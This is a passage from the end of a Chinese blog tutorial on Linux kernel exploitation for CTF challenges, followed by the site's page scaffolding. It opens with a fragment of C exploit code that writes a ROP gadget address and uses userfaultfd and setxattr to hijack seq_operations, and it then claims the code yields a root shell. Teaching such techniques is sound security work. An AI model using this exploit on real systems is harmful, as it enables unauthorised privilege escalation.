class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, <span class="hljs-number">0xffffffff814d51c0</span> + kernel_offset);<br>    *(<span class="hljs-type">size_t</span> *)(uffd_buf_hack + page_size - <span class="hljs-number">8</span>) = <span class="hljs-number">0xffffffff814d51c0</span> + kernel_offset;    <span class="hljs-comment">// add rsp , 0x1c8 ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15; pop rbp ; ret</span><br><br>    <span class="hljs-comment">// userfaultfd + setxattr to hijack the seq_ops-&gt;stat, trigger in uffd thread</span><br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    setxattr(<span class="hljs-string">&quot;/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, uffd_buf_hack + page_size - <span class="hljs-number">8</span>, <span class="hljs-number">32</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行即可 get root shell</p>
<p><img src="https://i.loli.net/2021/11/28/VKUbpCMhx2fSETq.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0xFF-What’s-mote"><a href="#0xFF-What’s-mote" class="headerlink" title="0xFF.What’s mote?"></a>0xFF.What’s mote?</h1><p>always <a target="_blank" rel="noopener" href="https://blog.woooo.tech/2019/12/02/Waiting%20for%20PWN/">waiting for pwn</a>…</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/PWN/" class="category-chain-item">PWN</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Linux/">#Linux</a>
      
        <a href="/tags/Linux-Kernel/">#Linux Kernel</a>
      
        <a href="/tags/Pwn/">#Pwn</a>
      
        <a href="/tags/Use-After-Free/">#Use After Free</a>
      
        <a href="/tags/Kernel-UAF/">#Kernel UAF</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF</div>
      <div>http://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>arttnba3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2021年3月3日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/04/08/CVE-0X00-CVE-2016-5195/" title="【CVE.0x00】CVE-2016-5195 “脏牛”漏洞复现及简要分析">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">【CVE.0x00】CVE-2016-5195 “脏牛”漏洞复现及简要分析</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/02/21/OS-0X01-LINUX-KERNEL-PART-II/" title="【OS.0x01】Linux Kernel II：内核简易食用指北">
                        <span class="hidden-mobile">【OS.0x01】Linux Kernel II：内核简易食用指北</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"说点什么呗（笑）","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  <!-- 网站运行时间的设置 -->
  <span id="timeDate">载入天数...</span>
  <span id="times">载入时分秒...</span>
  <script>
      var now = new Date();
      function createtime() {
          var grt= new Date("04/20/2020 17:48:48");//此处修改你的建站时间或者网站上线时间
          now.setTime(now.getTime()+250);
          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
          document.getElementById("timeDate").innerHTML = "arttnba3的小屋已经安全存在了 "+dnum+" 天 ";
          document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
      }
  setInterval("createtime()",250);
  </script>
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
